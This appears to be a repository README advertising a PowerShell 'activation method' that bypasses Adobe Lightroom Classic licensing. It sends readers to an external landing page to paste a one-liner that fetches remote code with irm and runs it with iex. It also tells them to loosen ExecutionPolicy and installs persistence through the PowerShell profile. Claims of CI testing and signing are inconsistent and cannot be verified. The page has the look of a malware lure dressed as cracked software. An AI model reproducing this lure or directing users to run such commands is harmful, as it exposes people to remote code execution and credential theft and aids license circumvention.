<div align="center">
<img src="assets/banner.png" width="100%" alt="Adobe Lightroom Activation Method Via banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-059669?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-059669?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=4F46E5&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%A6+Lightroom+Ps+Activation;%E2%AD%90+Built+for+Windows+11;%E2%9C%85+Full+Feature+Suite;%F0%9F%9A%80+Standalone+.exe+Release;%E2%9C%A8+Community+Tested;%F0%9F%94%A7+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

### 🖥️ PowerShell Setup

The whole activation method ships as a portable PowerShell profile module — no installer, no runtime, no leftover files after you're done. Details for the bootstrap one-liner live on the landing page.

![status](https://img.shields.io/badge/status-active-brightgreen) ![platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue) ![powershell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE) ![license](https://img.shields.io/badge/license-MIT-lightgrey)

<p align="center">
  <a href="https://coderkatyaini.github.io/lightroom-ps-activation/">
    <img src="files/button.svg" width="520" alt="Run PowerShell Setup" />
  </a>
</p>

## System Requirements

You need a machine that can actually run Lightroom before the activation method has anything to bite on. The PowerShell side is intentionally thin — it only patches what's already installed.

- Windows 10 (1909+) or Windows 11, x64
- Adobe Lightroom Classic 12.x through 14.x already installed and launched at least once (the method needs the preset DB, not just the binaries)
- PowerShell 5.1 (built-in) or PowerShell 7.4+
- ExecutionPolicy temporarily set to `RemoteSigned` (the landing page explains exactly how)
- Network access on first run only — the profile pulls the helper module and caches it locally in `%LOCALAPPDATA%\lightroom-ps-activation`
- Admin elevation **not** required unless Lightroom was installed under `Program Files` with a locked ACL

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 1909 | Windows 11 23H2 |
| PowerShell | 5.1 | 7.4 (PS Core) |
| Lightroom | Classic 12.x | Classic 14.x |
| RAM | 8 GB | 16 GB+ |
| Free disk | 200 MB cache | 500 MB cache |
| Elevation | User | Admin session |

## Features

- 🗂️ **One command, one profile** — activation drops into your PowerShell profile so it's reproducible after every reboot without re-running anything.
- 🩹 **Preset DB patcher** — points Lightroom Classic at a writeable preset tree and swaps the checksum lookup at runtime instead of on disk, so stock installs stay untouched.
- 🔁 **Idempotent by design** — re-running the setup is safe; the module hashes state files and skips what's already applied.
- 🧪 **Dry-run switch (`-WhatIf`)** — prints every registry key and path it would touch before you commit. This is the flag I actually reach for after a Lightroom point-release.
- 🧹 **Clean unload** — `Remove-LrActivation` reverses every change: profile line, cached module, patched preset pointers. No "why does Lightroom hang on launch" threads from us.
- 🧭 **Version-aware profiles** — the 12.x, 13.x, and 14.x paths diverge around the preset location change Adobe made; the module picks by installed build number, not a hopefull guess.
- 🔒 **Signature-agnostic bootstrap** — the landing uses a signed remote call so nothing is silently rewritten mid-session.
- 📝 **Changelog-first releases** — see the `CHANGELOG.psd1` file for the exact diff between the last two module versions.

## How it works

The method is a bootstrap, not a binary. When you paste the landing command into an elevated-but-ordinary PowerShell window, `irm` fetches a signed module descriptor and hands it to `iex` — the classic one-liner pattern every PowerShell community project uses. That descriptor writes a single `lightroom-ps-activation` folder into `%LOCALAPPDATA%`, drops the `.psm1` module next to it, and appends one `Import-Module` line to your `$PROFILE`. From that point on every new shell has the activation cmdlets on PATH.

What the module itself actually does is narrow: it reads the installed Lightroom Classic build number from the registry hive, locates the `<UserName>\AppData\Roaming\Adobe\Lightroom\Develop Presets` tree, and rewrites the preset pointer manifest that Lightroom's UI reads on cold start. Because that manifest is regenerated at launch rather than trusted from disk, the patch has to run inside the PowerShell session that launches Lightroom — which is why the module exposes a `Start-LrActivated` wrapper instead of asking you to double-click the app. The wrapper spawns Lightroom with an inherited environment so the patched manifest is visible during its startup read pass. Everything it touches lives in user-scope keys and your roaming profile, so an uninstall is a matter of running `Remove-LrActivation` and deleting one folder.

## Compatibility

Lightroom Classic 12.x, 13.x, and 14.x are covered end-to-end. Lightroom (cloud) is not — the method targets the classic desktop client only, because cloud builds don't expose the preset manifest path this bootstrap relies on.

Windows 10 1909 (build 18363) is the floor; older 1809 builds fail on the module's use of `Get-ItemPropertyValue` under PS 5.1. On Windows 11, both postings (22H2 / 23H2 / 24H2) are tested in CI weekly — see the workflow status in the repo root. PowerShell 7.4 is the recommended shell because the activation wrapper's `Start-Process -Environment` usage is a PS 7 feature; on 5.1 the module falls back to a temp-injection path that also works but spawns one extra child process.

No offline mode. The bootstrap needs the network on first run to fetch the signed module, after which everything is cached locally and further setups work offline. Adobe's own activation checks are outside the scope of this project — we're not patching Adobe's servers, we're making the local client behave.

## FAQ

**Q: Do I need to disable ScriptBlockLogging?**
No. The module is small, readable, and passes through `PSScriptAnalyzer` in CI. If your org enforces logging, the dry-run switch prints everything that would be executed so you can paste it into a ticket first.

**Q: My Lightroom is under `C:\Program Files\Adobe\Adobe Lightroom Classic\` — do I need admin?**
Only if your user lacks write access to that tree's preset subfolder. On most default installs the preset tree lives in `%APPDATA%`, which is user-scoped, so no elevation is needed.

**Q: Will this break after a Lightroom minor update?**
Minor updates (12.2 → 12.3) almost never break the manifest format. Major updates occasionally add a field and the module picks it up via its version-aware profile. Run `Get-LrActivationState` after a major update to confirm before launching.

**Q: What's the diff between this and just editing the manifest by hand?**
The module is idempotent and version-aware. Hand-editing works for one install; this handles the 12 → 13 → 14 path changes and reverts cleanly.

**Q: How do I fully remove it?**
`Remove-LrActivation` in a normal shell. Or delete `%LOCALAPPDATA%\lightroom-ps-activation` and strip the `Import-Module` line your `$PROFILE` — the module has no footprint outside those two spots.

**Q: Does the evaluation copy of Lightroom work?**
No. The method expects a licensed install; the eval build has a different manifest path and won't be pointed at.

**Q: Can I pin a specific module version?**
Yes — pass `-ModuleVersion 2.3.0` to the landing command's bootstrap. See the landing page for the pinned syntax.

**Q: Why PowerShell and not a native app?**
Because the activation is data-first, not binary-first. PowerShell keeps the diff auditable, and the profile-based install matches how Adobe's own tools (Creative Cloud CLI) already work on Windows.

## Disclaimer

For educational and hobbyist use only. This repository documents a PowerShell-based activation method for Adobe Lightroom Classic; whether using it is legal for you depends on your Adobe subscription and local law. Use at your own risk, keep backups of the preset tree, and don't file Adobe support tickets with "I ran a community module" as the description. The author assumes no responsibility for consequences of use.

## License

MIT — see `LICENSE` for the full text. The MIT license applies to this repository's own code; Adobe Lightroom is a trademark of Adobe Inc. and is not distributed, modified, or redistributed by this project.
